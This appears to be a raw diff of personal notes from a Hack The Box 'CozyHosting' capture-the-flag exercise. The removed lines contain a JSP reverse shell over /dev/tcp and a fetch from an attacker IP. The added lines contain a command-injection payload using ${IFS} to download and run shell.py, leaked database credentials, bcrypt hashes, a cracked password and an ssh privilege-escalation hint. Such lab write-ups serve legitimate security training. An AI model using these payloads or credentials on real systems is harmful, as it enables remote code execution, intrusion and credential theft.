@@ -45,9 +45,34 @@ htb.cloudhosting.CozyHostingApp$$SpringCGLIB$$0
 usage: ssh [-46AaCfGgKkMNnqsTtVvXxYy] [-B bind_interface]%20%20%20%20%20%20%20%20%20%20 [-b bind_address] [-c cipher_spec] [-D [bind_address:]port]%20%20%20%20%20%20%20%20%20%20 [-E log_file] [-e escape_char] [-F configfile] [-I pkcs11]%20%20%20%20%20%20%20%20%20%20 [-i identity_file] [-J [user@]host[:port]] [-L address]%20%20%20%20%20%20%20%20%20%20 [-l login_name] [-m mac_spec] [-O ctl_cmd] [-o option] [-p port]%20%20%20%20%20%20%20%20%20%20 [-Q query_option] [-R address] [-S ctl_path] [-W host:port]%20%20%20%20%20%20%20%20%20%20 [-w local_tun[:remote_tun]] destination [command [argument ...]]
 
 
+localhost
+kanderson@127.0.0.1;curl${IFS}http://10.10.14.136:8000/shell.py${IFS}-o${IFS}/tmp/shell.py;python3${IFS}/tmp/shell.py;#
 
 
-<% URL obj = new URL("http://10.10.14.136:8000/test.jpg");	HttpURLConnection con = (HttpURLConnection) obj.openConnection();	con.setRequestMethod("GET"); int responseCode = con.getResponseCode(); %>
+server.address=127.0.0.1
+server.servlet.session.timeout=5m
+management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
+management.endpoint.sessions.enabled = true
+spring.datasource.driver-class-name=org.postgresql.Driver
+spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
+spring.jpa.hibernate.ddl-auto=none
+spring.jpa.database=POSTGRESQL
+spring.datasource.platform=postgres
+spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
+spring.datasource.username=postgres
+spring.datasource.password=Vg&nvzAQ7XxR
 
 
-<% Runtime r = Runtime.getRuntime(); Process p = r.exec("/bin/bash -c 'exec 5<>/dev/tcp/10.10.14.136/6666;cat <&5 | while read line; do $line 2>&5 >&5; done'"); p.waitFor();
+kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
+ admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
+
+
+ FakeUser.class
+ username=kanderson&password=MRdEQuv6~6P9
+
+this password doesnt work
+
+but if we crack the admin password we found it is : manchesterunited
+it's the josh password, we can use it with ssh
+
+now we do a sudo -l, we have right to run ssh as root
